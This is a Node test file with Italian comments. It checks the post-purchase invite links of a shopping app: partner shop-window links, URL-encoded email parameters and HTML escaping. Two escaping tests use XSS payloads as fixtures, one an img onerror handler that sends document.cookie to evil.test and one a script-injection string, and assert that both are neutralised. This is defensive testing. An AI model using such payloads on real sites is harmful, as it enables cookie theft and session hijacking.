// Verifica l'invito "Scopri la vetrina online di [nome negozio] →" / "Scopri
// altri articoli per te →" mostrato dopo un acquisto completato
// (ShippedScreen) — vedi MANUALE.md per la descrizione completa e
// finalizeShippedGroups()/ShippedScreen() in app.js per dove viene
// calcolato/mostrato.
//
// Punti richiesti, verificati sulle funzioni pure reali (stesso identico
// app.js caricato in una finestra jsdom isolata, stessa tecnica di
// partner-generate-shipment.test.js — window.<funzione> dopo il boot):
// (1) un acquisto con partnerCode valorizzato mostra l'invito con il link
//     corretto.
// (2) un acquisto self-service senza partner non mostra il primo link
//     (nessuna vetrina a cui rimandare), ma mostra comunque il secondo
//     link "per te".
// (3) l'email nel link "per te" è correttamente urlencoded.
// (4) escapeHtml() su un nome negozio malevolo.

const test = require("node:test");
const assert = require("node:assert/strict");
const vm = require("node:vm");
const fs = require("node:fs");
const path = require("node:path");
const { JSDOM } = require("jsdom");

const APP_JS_PATH = path.join(__dirname, "..", "app.js");
const APP_JS_SOURCE = fs.readFileSync(APP_JS_PATH, "utf8");

function bootApp(t) {
  const dom = new JSDOM(`<!doctype html><html><body><div id="app"></div></body></html>`, {
    url: "https://touchandgo.test/",
    runScripts: "outside-only",
    pretendToBeVisual: true,
  });
  t.after(() => dom.window.close());
  const { window } = dom;
  window.fetch = () => Promise.reject(new Error("network disabled in test"));
  const context = dom.getInternalVMContext();
  vm.runInContext(APP_JS_SOURCE, context, { filename: "app.js" });
  return { window, context };
}

// state è dichiarato "const" in app.js: accessibile come identificatore
// bare nel context, non come window.state — stessa tecnica/stessa nota
// tecnica già usata in support-trail.test.js/support-request.test.js.
function setState(context, patch) {
  vm.runInContext(`Object.assign(state, ${JSON.stringify(patch)});`, context, { filename: "set-state.js" });
}
function getState(context, expr) {
  return vm.runInContext(`state.${expr}`, context, { filename: "get-state.js" });
}
// Normalizza un array/oggetto cross-realm (creato dentro il context vm,
// con un Array/Object di un'altra realm) prima di un deepEqual — stessa
// tecnica già usata in support-request.test.js: senza, deepStrictEqual
// fallisce per "stessa struttura ma non reference-equal" anche quando i
// valori sono davvero identici.
function norm(value) {
  return JSON.parse(JSON.stringify(value));
}

// ---------------------------------------------------------------------
// partnerEshopInvitesForItems — quali negozi (con vetrina pubblicata)
// sono coinvolti in un dato elenco di item spediti.
// ---------------------------------------------------------------------

test("(1) un item con partnerCode valorizzato (NDP924) produce l'invito con il link corretto", (t) => {
  const { window } = bootApp(t);
  const invites = window.partnerEshopInvitesForItems([{ id: "a", partnerCode: "NDP924" }]);
  assert.deepEqual(norm(invites), [{ name: "Negozio Demo", eshopUrl: "https://touchandgo-eshop.netlify.app/site/index.html" }]);
});

test("(1b) un item con generatedByPartnerCode valorizzato (gestionale partner) produce lo stesso invito", (t) => {
  const { window } = bootApp(t);
  const invites = window.partnerEshopInvitesForItems([{ id: "a", generatedByPartnerCode: "NDP924" }]);
  assert.equal(invites.length, 1);
  assert.equal(invites[0].eshopUrl, "https://touchandgo-eshop.netlify.app/site/index.html");
});

test("(2) un item self-service (nessun partnerCode/generatedByPartnerCode) non produce alcun invito vetrina", (t) => {
  const { window } = bootApp(t);
  const invites = window.partnerEshopInvitesForItems([{ id: "a" }]);
  assert.deepEqual(norm(invites), []);
});

test("un partner senza vetrina pubblicata (codice sconosciuto a PARTNER_ESHOP_INFO) non produce alcun invito, mai un errore", (t) => {
  const { window } = bootApp(t);
  const invites = window.partnerEshopInvitesForItems([{ id: "a", partnerCode: "ALTRO-PARTNER-SENZA-VETRINA" }]);
  assert.deepEqual(norm(invites), []);
});

test("più item dello stesso partner producono un solo invito (deduplicato), mai uno ripetuto", (t) => {
  const { window } = bootApp(t);
  const invites = window.partnerEshopInvitesForItems([
    { id: "a", partnerCode: "NDP924" },
    { id: "b", generatedByPartnerCode: "NDP924" },
  ]);
  assert.equal(invites.length, 1);
});

test("un elenco vuoto/assente non genera errori", (t) => {
  const { window } = bootApp(t);
  assert.deepEqual(norm(window.partnerEshopInvitesForItems([])), []);
  assert.deepEqual(norm(window.partnerEshopInvitesForItems(undefined)), []);
});

// ---------------------------------------------------------------------
// (3) perTeUrl — sempre costruito, email correttamente urlencoded.
// ---------------------------------------------------------------------

test("(3) perTeUrl urlencoda correttamente l'email (caratteri speciali inclusi)", (t) => {
  const { window } = bootApp(t);
  const url = window.perTeUrl("mario+rossi@example.it");
  assert.equal(url, "https://touchandgo-eshop.netlify.app/site/per-te.html?email=mario%2Brossi%40example.it");
});

test("(3b) perTeUrl senza email (turista non identificato) resta un link valido, mai un errore", (t) => {
  const { window } = bootApp(t);
  const url = window.perTeUrl(null);
  assert.equal(url, "https://touchandgo-eshop.netlify.app/site/per-te.html?email=");
});

// ---------------------------------------------------------------------
// partnerEshopInviteHtml — markup finale mostrato in ShippedScreen.
// ---------------------------------------------------------------------

test("(1c) con un invito vetrina, l'HTML contiene ENTRAMBI i link (vetrina + 'per te')", (t) => {
  const { window } = bootApp(t);
  const html = window.partnerEshopInviteHtml([{ name: "Negozio Demo", eshopUrl: "https://touchandgo-eshop.netlify.app/site/index.html" }], "maria@example.it");
  assert.match(html, /Scopri la vetrina online di Negozio Demo/);
  assert.match(html, /href="https:\/\/touchandgo-eshop\.netlify\.app\/site\/index\.html"/);
  assert.match(html, /Scopri altri articoli per te/);
  assert.match(html, /email=maria%40example\.it/);
});

test("(2b) senza invito vetrina (acquisto self-service), l'HTML NON contiene il primo link ma contiene sempre 'per te'", (t) => {
  const { window } = bootApp(t);
  const html = window.partnerEshopInviteHtml([], "maria@example.it");
  assert.ok(!html.includes("Scopri la vetrina online di"), "nessuna vetrina a cui rimandare per un acquisto self-service");
  assert.match(html, /Scopri altri articoli per te/);
});

// ---------------------------------------------------------------------
// (4) escapeHtml() su un nome negozio malevolo.
// ---------------------------------------------------------------------

test("(4) un nome negozio malevolo reale non compare mai come markup eseguibile", (t) => {
  const { window } = bootApp(t);
  const malicious = '<img src=x onerror="fetch(\'https://evil.test/steal?c=\'+document.cookie)">';
  const html = window.partnerEshopInviteHtml([{ name: malicious, eshopUrl: "https://touchandgo-eshop.netlify.app/site/index.html" }], "x@example.it");
  assert.ok(!html.includes("<img src=x"), "il tag malevolo non deve sopravvivere come markup reale");
  assert.ok(html.includes("&lt;img"), "il contenuto deve restare visibile come testo letterale, solo escapato");
});

test("(4b) un URL vetrina malevolo (campo comunque proveniente da dati interni, mai da input turista) viene comunque escapato", (t) => {
  const { window } = bootApp(t);
  const html = window.partnerEshopInviteHtml([{ name: "Negozio", eshopUrl: '"><script>alert(1)</script>' }], "x@example.it");
  assert.ok(!html.includes("<script>alert"));
});

// ---------------------------------------------------------------------
// Integrazione: finalizeShippedGroups() calcola state.shippedPartnerInvites
// dagli item ANCORA presenti in state.pendingItems, prima che vengano
// svuotati — verificato direttamente sullo state reale dell'app, senza
// simulare l'intero checkout Stripe (già coperto da checkout-payment.test.js).
// ---------------------------------------------------------------------

test("finalizeShippedGroups calcola correttamente state.shippedPartnerInvites dagli item spediti", (t) => {
  const { window, context } = bootApp(t);
  const item = {
    id: "TG-TEST1",
    objectName: "Borsa",
    addressLabel: "Roma, Italia",
    weightKg: 1,
    pricingTier: "pieno",
    partnerCode: "NDP924",
  };
  setState(context, { pendingItems: [item], purchaseHistory: [item], touristEmail: "maria@example.it" });
  window.finalizeShippedGroups();
  // JSON.parse(JSON.stringify(...)) normalizza l'array cross-realm
  // restituito dal context vm — stessa tecnica già usata in
  // support-request.test.js.
  assert.deepEqual(JSON.parse(JSON.stringify(getState(context, "shippedPartnerInvites"))), [
    { name: "Negozio Demo", eshopUrl: "https://touchandgo-eshop.netlify.app/site/index.html" },
  ]);
});

test("finalizeShippedGroups per un acquisto self-service produce state.shippedPartnerInvites vuoto", (t) => {
  const { window, context } = bootApp(t);
  const item = { id: "TG-TEST2", objectName: "Vaso", addressLabel: "Milano, Italia", weightKg: 1, pricingTier: "pieno" };
  setState(context, { pendingItems: [item], purchaseHistory: [item], touristEmail: "luca@example.it" });
  window.finalizeShippedGroups();
  assert.deepEqual(JSON.parse(JSON.stringify(getState(context, "shippedPartnerInvites"))), []);
});
